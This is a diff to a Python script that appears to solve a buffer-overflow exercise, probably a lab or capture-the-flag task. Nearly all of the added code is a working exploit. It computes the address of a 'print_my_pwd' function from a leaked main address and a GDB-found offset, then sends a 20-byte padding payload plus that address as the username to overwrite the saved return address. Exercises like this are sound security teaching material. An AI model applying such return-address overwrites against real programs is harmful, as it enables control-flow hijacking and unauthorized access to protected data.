@@ -28,5 +28,20 @@ def eprint(*args, **kwargs):
 # Here we have the address of the main function.
 pmain = int(sys.stdin.readline(), 16)
 
-writeStr("Name\n")
-writeStr("Password\n")
+# p (char*)&print_my_pwd - (char*)&main)
+offset_main_to_print_my_pwd = -160
+
+# Offset from &name to saved rip inside check_user (found via GDB)
+# 0x7fffffffd418 (rip) - 0x7fffffffd404 (name), 0x7fffffffd418 - 0x7fffffffd404 = 20
+offset_name_to_rip = 20
+
+p_print_my_pwd = pmain + offset_main_to_print_my_pwd
+
+eprint(f"pmain          = {hex(pmain)}")
+eprint(f"p_print_my_pwd = {hex(p_print_my_pwd)}")
+
+# [20 bytes padding] + [8 bytes address of print_my_pwd in little-endian]
+payload = b"A" * offset_name_to_rip + p_print_my_pwd.to_bytes(8, 'little')
+
+writeBytes(payload + b"\n")  # username (overflows into saved rip)
+writeStr("wrongpassword\n")   # password (doesn't matter)
